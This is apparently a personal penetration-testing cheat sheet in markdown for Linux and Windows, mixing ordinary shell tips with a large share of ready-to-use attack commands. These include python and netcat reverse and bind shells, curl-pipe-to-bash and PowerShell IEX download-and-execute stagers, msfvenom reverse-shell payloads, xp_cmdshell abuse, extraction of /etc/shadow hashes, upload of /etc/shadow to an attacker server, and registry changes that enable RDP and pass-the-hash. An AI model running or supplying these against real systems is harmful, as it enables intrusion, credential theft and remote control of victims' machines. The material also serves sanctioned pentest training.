# linux

## find 
```bash
find / -type f -iname '*powercat*' 2>/dev/null 
```

cat all files in home dir
```bash
find ~/ -type f -exec ls -l {} \; -exec cat {} \; -exec bash -c 'printf "%*s\n" $(tput cols) "" | tr " " "-" && echo' \;
```


## less

start less in case insensitive search mode
```bash
less -I huge.log

# search
/
# next match
n
# prev match 
N (shift+n)
```

[searching](https://linuxhandbook.com/search-less-command/)
## bootleg tree
```bash
find . -print | sed -e 's;[^/]*/;|____;g;s;____|; |;g'
```
## grep windows CRLF file

```bash
cat fileMonitorBackup.log | dos2unix | grep -i backup
```

## sed find and replace string
```bash
cat targets.txt | sed 's/205/238/g' 
cat targets.txt | sed 's/<find>/<replace>/g' > targets.txt 
```
## awk
take column 6 and 11 with (default field separator of space)
```bash
awk '{print $6 ":" $11}' files02.hash > files02.hash.awk
```
>NOTE: you can't awk in place with > because it will just erase the file before awk gets it. so use a temp file as above then rename it if you need

pull users and hashes from /etc/shadow
```bash
awk -F: '{print $1 ":" $2}' shadow | grep -ve '*' -e '!' > users.hash
awk -F: '$2 !~ /^[!*]+$/ {print $1 ":" $2}' /etc/shadow > users.hash
```
## [python venv](https://packaging.python.org/en/latest/guides/installing-using-pip-and-virtual-environments/) installs

### create venv
nav to cloned folder dir, then create the venv:
```bash
python3 -m venv .venv
source .venv/bin/activate

# demostrate venv
which python

# when done
deactivate
```
### install
run whatever install script or pip requirements command and it will install the dependencies in the venv. HOWEVER:
#### if its in a sudo dir
DO NOT `sudo pip install -r requirements.txt` etc as this will defeat the venv and install it globally! instead:
```bash
sudo -HE env PATH=$PATH pip install -r requirements.txt
sudo -HE env PATH=$PATH <install commands here>
```
### script to call a venv app from path

create script in PATH dir
```bash
sudo nano /usr/bin/<commandName>
```
script contents:
```bash
#!/bin/bash
# Activate your virtual environment
source /path/to/your/.venv/bin/activate
# Run app command with arguments
python /path/to/app/script.py "$@"


# Deactivate the virtual environment (UNNECCESSARY?? - LEAVE THIS OUT)
deactivate
```

then give it perms
```bash
sudo chmod +x /usr/bin/<commandName>
```

then you should be able to just rip `commandName` from command line!
## alternate autocomplete/history search
https://github.com/zsh-users/zsh-autosuggestions/issues/303

## mass ping
```bash
for ip in $(cat extTargets.txt); do ping -c 3 $ip ; done

# clearer with horizontal rule
for ip in $(cat computers.txt); do printf '%*s\n' "${COLUMNS:-$(tput cols)}" '' | tr ' ' - ; ping -c 3 $ip ; done
```
## nmap hacks

### nested scan
```bash
# first scan all open ports (REMOVE -T4 if youre worried about accuracy)
sudo nmap 192.168.238.242 -T4 -p- -oA nmap/all -vvv

# then extract the ports 
openPorts=$(cat nmap/all.nmap | grep open | awk -F / '{print $1}' ORS=,)

# then run deeper scan on them!
sudo nmap 192.168.238.242 -sCV -p $openPorts -vvv -oA nmap/scvAll

# and even deeper for vulns
sudo nmap $IP -sV --script vuln -p $openPorts -vvv -oA nmap/vuln

# or defaults and vulns all in one fatty
sudo nmap $IP -sV --script default,vuln -p $openPorts -T4 -vvv -oA nmap/vuln
```
 or all in one nested monster line: (add ip to the $IP var)
```bash
sudo nmap $IP -T4 -p- | grep open | awk -F / '{print $1}' ORS=, | xargs -I {} sudo nmap -sCV -p {} $IP -T4 -oA nmap/scvAll -vvv

# improved version that lets you read it as it comes out and saves both reports
sudo nmap $IP -T4 -p- -vvv -oA nmap/all | tee /dev/tty | grep -v Discovered | grep open | awk -F / '{print $1}' ORS=, | xargs -I {} sudo nmap -sCV -p {} $IP -T4 -oA nmap/scvAll -vvv

# v2.1 that runs default and vulns -- TAKLES A WHILE
sudo nmap $IP -T4 -p- -vvv -oA nmap/all | tee /dev/tty | grep -v Discovered | grep open | awk -F / '{print $1}' ORS=, | xargs -I {} sudo nmap -sV --script default,vuln -p {} $IP -T4 -oA nmap/scvAllVuln -vvv
```

### smb vuln scan

```bash
sudo nmap $IP -T4 -sV -p 139,445 --script smb-vuln* -vvv -oA nmap/smbvuln
```
## gobuster

```bash
gobuster dir -u http://192.168.50.242 -w /usr/share/wordlists/dirb/common.txt -o mailsrv1/gobuster -x txt,pdf,config
```
## revshells
upgrade shell:
```bash
python3 -c "import pty;pty.spawn('/bin/bash')"
# CTRL+Z to background 
stty raw -echo; fg
# PRESS ENTER (do not type anything else just hit enter at the blank prompt)
reset
xterm

# bonus points (not sure precisely what this helps):
export TERM=xterm
```

```bash
python3 -c 'import pty; pty.spawn(["env","TERM=xterm-256color","/bin/bash","--rcfile", "/etc/bash.bashrc","-i"])'
```

nc bind:
```bash
nc -nlvp 4444 -e cmd.exe
rm -f /tmp/f; mkfifo /tmp/f; cat /tmp/f | /bin/sh -i 2>&1 | nc -l 0.0.0.0 4444 > /tmp/f
```

bootleg text editor for revshell: (heredoc)
```bash
cat << 'EOF' > file.txt
```
### python nested quotes revshell solution

put it in a bash script
```bash
#!/bin/bash

python3 -c 'import socket,subprocess,os;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect(("192.168.118.11",4444));os.dup2(s.fileno(),0); os.dup2(s.fileno(),1); os.dup2(s.fileno(),2);p=subprocess.call(["/bin/sh","-i"]);'
```
then dl it and pipe it in
```bash
curl http://192.168.118.11/shell.sh | bash
```

### msfvenom elf binary
```bash
sudo msfvenom -p linux/x64/shell_reverse_tcp  LHOST=tun0 LPORT=81 -f elf -o /usr/local/share/post-exploitation/linux/privEsc/shell81
```
## useful repos

[static bins](https://github.com/andrew-d/static-binaries)
# windows
## cmd 

### web request

```cmd
certutil.exe -urlcache -split -f "http://10.10.14.13:8000/shell.exe" s.exe 
```

### grep 

```cmd
command_that_produces_output | findstr "pattern"
```
## powershell 

### find

```powershell
Get-ChildItem -Path C:\ -Include *.<ext> -File -Recurse -ErrorAction SilentlyContinue
```

exclude folder or pattern:
```powershell
Get-ChildItem -Path C:\ -Include password* -File -Recurse -ErrorAction SilentlyContinue | Where-Object FullName -notmatch windows
```
### grep
```powershell
type "fileMonitorBackup.log" | Select-String -Pattern "backup"
type "fileMonitorBackup.log" | Select-String -NotMatch windows
```
### web request in memory

```powershell
IEX(IWR http://192.168.45.198/Invoke-ConPtyShell.ps1 -UseBasicParsing); Invoke-ConPtyShell
# if you just wanna dot source it real quick then call the 
IEX (IWR -Uri http://192.168.45.179/scripts/PowerView.ps1 -UseBasicParsing)
```

### staged shell for single command cmd.exe RCE

first prepare a script, stage.ps1, that contains:
```powershell
IEX(IWR http://192.168.45.193/Invoke-ConPtyShell.ps1 -UseBasicParsing); Invoke-ConPtyShell 192.168.45.193 49668 
```
and host it along with `Invoke-ConPtyShell.ps1`

then call it from your RCE vector with this command
```cmd
echo IEX(New-Object Net.WebClient).DownloadString("http://192.168.45.193/stage.ps1") | powershell -noprofile
```

or from MSSQL for example
```sql
EXECUTE sp_configure 'show advanced options', 1; RECONFIGURE; EXECUTE sp_configure 'xp_cmdshell', 1; RECONFIGURE;
EXEC xp_cmdshell 'echo IEX(New-Object Net.WebClient).DownloadString("http://192.168.45.193/shell.ps1") | powershell -noprofile'
```

then catch it as described [[#ConPty upgraded interactive revshell|below]]
### ConPty upgraded interactive revshell

>NOTE: this doesnt work in GodPotato and possibly other low level privesc exploits

upload `/usr/share/nishang/Shells/Invoke-ConPtyShell.ps1` then rip it:

on target
```powershell
Invoke-ConPtyShell 192.168.45.198 3001
```

or one liner upload and rip in memory:
```powershell
IEX(IWR https://raw.githubusercontent.com/antonioCoco/ConPtyShell/master/Invoke-ConPtyShell.ps1 -UseBasicParsing); Invoke-ConPtyShell 192.168.45.198 3001

# or if no internet access on target, host it yourself and call it:
IEX(IWR http://192.168.45.198/Invoke-ConPtyShell.ps1 -UseBasicParsing); Invoke-ConPtyShell 192.168.45.198 3001
```

listener on kali:
```bash
stty raw -echo; (stty size; cat) | nc -lvnp 3001
```

more methods and manual upgrade in readme on [repo](https://github.com/antonioCoco/ConPtyShell)
### elevate interactive shell to admin (with rights)

```powershell
Start-Process powershell -Verb runas
```
should work with cmd as well?
### bypass script restriction

```powershell
powershell -ep bypass
Set-ExecutionPolicy -ExecutionPolicy Unrestricted -Scope CurrentUser
```

### filter results into list (show all properties?)

```powershell
<command> | fl
Get-Acl -Path HKLM:SYSTEM\CurrentControlSet\Services\LanmanServer\DefaultSecurity\ | fl
```

## RDP

username options note: `/u:[[<domain>\]<user>|<user>[@<domain>]]`

with no creds, you can take a gander with `rdesktop`
```bash
rdesktop 192.168.246.247
```

if you get cert error, try:
```bash
xfreerdp /cert-ignore /bpp:8 /compression -themes -wallpaper /auto-reconnect /h:1000 /w:1400 /u:rdp_admin /p:'P@ssw0rd!' /v:192.168.240.64
```

with file transfer and optimizations:
```bash
xfreerdp /v:IP /u:USERNAME /p:PASSWORD +clipboard /dynamic-resolution /bpp:8 /drive:/usr/share/windows-resources,share /cert-ignore
```

my preferred settings:
```bash
xfreerdp /u:sender /p:'password123!' /v:192.168.208.151 /cert-ignore /bpp:8 +clipboard /dynamic-resolution &  
```

wroth trying when you should be able to get in:
```bash
/restricted-admin  
```
### enable RDP (req admin, post exploitation)
```cmd
# FROM HACKTRICKS: Enable Remote Desktop

reg add "HKEY_LOCAL_MACHINE\SYSTEM\CurrentControlSet\Control\Terminal Server" /v fDenyTSConnections /t REG_DWORD /d 0 /f
netsh firewall add portopening TCP 3389 "Remote Desktop"
::netsh firewall set service remotedesktop enable #I found that this line is not needed
::sc config TermService start= auto #I found that this line is not needed
::net start Termservice #I found that this line is not needed
```
### enable rdp pass-the-hash
```cmd
reg add HKLM\System\CurrentControlSet\Control\Lsa /t REG_DWORD /v DisableRestrictedAdmin /d 0x0 /f
```

## disable local account token filter policy for PsExec

```cmd
reg add HKLM\SOFTWARE\Microsoft\Windows\CurrentVersion\Policies\system /v LocalAccountTokenFilterPolicy /t REG_DWORD /d 1 /f
```
## msfvenom binary revshell exe
```bash
sudo msfvenom -p windows/x64/shell_reverse_tcp LHOST=tun0 LPORT=8443 -f exe -o /usr/local/share/post-exploitation/windows/privEsc/bin/shell8443.exe
```
## cross compiler install:
```bash
sudo apt install mingw-w6
```

### useful repos

[sharpCollection](https://github.com/Flangvik/SharpCollection)

## IIS password decrypt from config file

```cmd
cd c:\windows\system32\inetsrv\
appcmd list apppools
appcmd list apppools /text:name
appcmd list apppool "MyTestPool" /text:*

# alt, just creds
C:\Windows\System32\inetsrv>appcmd list apppool "MyTestPool" /text:processmodel.username
C:\Windows\System32\inetsrv>appcmd list apppool "MyTestPool" /text:processmodel.password
```

https://www.netspi.com/blog/technical/network-penetration-testing/decrypting-iis-passwords-to-break-out-of-the-dmz-part-2/

# git enum

if you run into problems, check out git-dumper:
https://github.com/arthaud/git-dumper

```git
git show
git log
git show 967fa71c359fffcbeb7e2b72b27a321612e3ad11
git status
git diff
git branch

git grep -C 1 password
```
## command guide
1. **git clone**: Clone the repository to your local machine.
   ```bash
   git clone <repository_url>
   ```

2. **git log**: View the commit history to understand the evolution of the repository.
   ```bash
   git log
   ```

3. **git status**: Check the current status of the repository, including any modified or untracked files.
   ```bash
   git status
   ```

4. **git diff**: View the differences between files, useful for understanding changes made between commits.
   ```bash
   git diff
   ```

5. **git branch**: List all branches in the repository.
   ```bash
   git branch -a
   ```

6. **git show**: Show information about a specific commit.
   ```bash
   git show <commit_hash>
   ```

7. **git blame**: See who last modified each line of a file, helpful for understanding the history of changes.
   ```bash
   git blame <file_name>
   ```

8. **git grep**: Search for specific strings or patterns within the repository.
   ```bash
   git grep <search_term>
   ```

9. **git remote**: View the remote repositories associated with the local repository.
   ```bash
   git remote -v
   ```

10. **git reflog**: Show a log of changes to the repository's HEAD.
   ```bash
   git reflog
   ```

11. **git fsck**: Perform a filesystem check on the repository.
   ```bash
   git fsck
   ```

# msfvenom payload cheatsheet

https://infinitelogins.com/2020/01/25/msfvenom-reverse-shell-payload-cheatsheet/
# file transfers 

## apache web server

### on attacking kali:

#### recv from linux
`cat /var/www/html/upload.php`:
```php
<?php 

$target_path = "uploads/"; 
$target_path = $target_path . basename( $_FILES['uploadedfile']['name']); 

echo "Source=" . $_FILES['uploadedfile']['name'] . "<br />"; 
echo "Target path=" . $target_path . "<br />"; 
echo "Size=" . $_FILES['uploadedfile']['size'] . "<br />"; 

if(move_uploaded_file($_FILES['uploadedfile']['tmp_name'], $target_path)) { 
echo "The file " . basename( $_FILES['uploadedfile']['name']) . " has been uploaded"; 
} else{ 
echo "There was an error uploading the file, please try again!"; 
} 
?>
```

#### recv from windows
`cat /var/www/html/uploadWindows.php`:
```php
<?php 
$uploaddir = '/var/www/html/uploads/';

$uploadfile = $uploaddir . $_FILES['file']['name'];

move_uploaded_file($_FILES['file']['tmp_name'], $uploadfile)
?>
```
#### optional front end

`cat /var/www/html/upload.html`
```html
<html>
<head></head>
<body>
<h4> File uploads </h4>
<form enctype="multipart/form-data" action="upload.php"
    method="post">
<p>
Select File:
<input type="file" name="uploadedfile" />
<input type="submit" name="Upload" value="Upload" />
</p>
</form>
</body>
</html>
```

rendered front end:
<html>
<head></head>
<body>
<h4> File uploads </h4>
<form enctype="multipart/form-data" action="upload.php"
    method="post">
<p>
Select File:
<input type="file" name="uploadedfile" />
<input type="submit" name="Upload" value="Upload" />
</p>
</form>
</body>
</html>

#### setup cmds
```bash
mkdir /var/www/html/uploads/
chmod 777 /var/www/html/uploads/
systemctl restart apache2
```

>If the upload isn't working, but the command is completing successfully, the _upload_max_filesize_ setting in **`/etc/php/<version>/apache2/php.ini`** may need to be increased.

### on remote machine victim

###### linux

```bash
curl --form "uploadedfile=@/etc/shadow" http://192.168.48.3/upload.php
```

###### windows

```powershell
powershell (New-Object System.Net.WebClient).UploadFile('http://192.168.48.3/uploadWindows.php', '.\Secrets.jpg')
```

## smb

found [here](https://www.reddit.com/r/oscp/comments/13l244t/best_ways_to_transfer_files_from_windows_to_kali/):
 
start smb server on your kali VM in directory you want to put file: 
```bash
impacket-smbserver share . -smb2support -username user -password password
```

On the Windows machine, openPowerShell as administrator and run: 
```cmd
net use X: \\192.168.45.179\share /u:user password
cp * x:\ -Recurse
```

drive should show up in file explorer as `X:` or whatever letter you assigned in the powershell command

when done, disconnect:
```cmd
net use x: /delete
```
#### ***alternate*** RDP (untested)

2. open Run and enter: `\\<Kali VM IP address>\<chosen SMB drive name>`

once you have the drive showing up in windows, you can just drag and drop the file(s)


# cheat sheets

https://github.com/swisskyrepo/PayloadsAllTheThings

[the Runbook](https://medium.com/@Fanicia/oscp-prep-introducing-my-runbooks-enumeration-46d7ce270033)

## craig's recs

https://www.thehacker.recipes/
https://ppn.snovvcrash.rocks/
https://rmusser.net/docs/#/
https://lolbas-project.github.io/#
https://wadcoms.github.io/#
https://filesec.io/
https://gtfobins.github.io/
https://github.com/gquere/pwn_jenkins